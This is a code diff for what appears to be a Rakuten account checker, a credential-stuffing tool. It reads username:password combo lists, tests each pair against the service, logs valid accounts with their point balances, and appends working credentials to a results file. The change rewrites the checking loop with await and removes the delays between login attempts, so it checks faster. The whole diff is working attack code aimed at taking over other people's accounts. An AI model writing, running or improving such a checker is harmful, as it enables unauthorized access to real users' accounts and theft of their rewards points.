@@ -86,40 +86,61 @@ export class ComboRakutenRouter {
           {},
           `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析中・・・`,
         );
-        new StandRakutenRouter(
+        // new StandRakutenRouter(
+        //   this.logger,
+        //   this.enogu,
+        //   this.loggerMessages,
+        //   this.config,
+        // )
+        //   .check(comboResult[i].username, comboResult[i].password)
+        //   .then((result) => {
+        //     if (!JSON.parse(result.message).success) {
+        //       return;
+        //     }
+
+        //     this.logger.info(
+        //       {},
+        //       `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析完了`,
+        //     );
+        //     this.logger.info(
+        //       {},
+        //       `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} ポイント: ${JSON.parse(result.message).point}`,
+        //     );
+
+        //     fs.appendFileSync(
+        //       resultFilePath,
+        //       `${comboResult[i].username ?? "unknown"}:${comboResult[i].password ?? "unknown"}:${JSON.parse(result.message).point}`.replace(
+        //         /\n/gm,
+        //         "",
+        //       ) + "\n",
+        //     );
+          // });
+
+        const result = await new StandRakutenRouter(
           this.logger,
           this.enogu,
           this.loggerMessages,
           this.config,
+        ).check(comboResult[i].username, comboResult[i].password);
+
+        if (!JSON.parse(result.message).success) {
+          return;
+        }
+
+        this.logger.info(
+          {},
+          `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析完了`,
         )
-          .check(comboResult[i].username, comboResult[i].password)
-          .then((result) => {
-            if (!JSON.parse(result.message).success) {
-              return;
-            }
 
-            this.logger.info(
-              {},
-              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析完了`,
-            );
-            this.logger.info(
-              {},
-              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} ポイント: ${JSON.parse(result.message).point}`,
-            );
-
-            fs.appendFileSync(
-              resultFilePath,
-              `${comboResult[i].username ?? "unknown"}:${comboResult[i].password ?? "unknown"}:${JSON.parse(result.message).point}`.replace(
-                /\n/gm,
-                "",
-              ) + "\n",
-            );
-          });
-
-        await wait(this.config.values.interval + 2500);
+        fs.appendFileSync(
+          resultFilePath,
+          `${comboResult[i].username ?? "unknown"}:${comboResult[i].password ?? "unknown"}:${JSON.parse(result.message).point}`.replace(
+            /\n/gm,
+            "",
+          )
+        )
       }
 
-      await wait(content.length * 30000);
     } else {
       this.logger.error({}, "正しいファイルパスを入力してください");
       return;
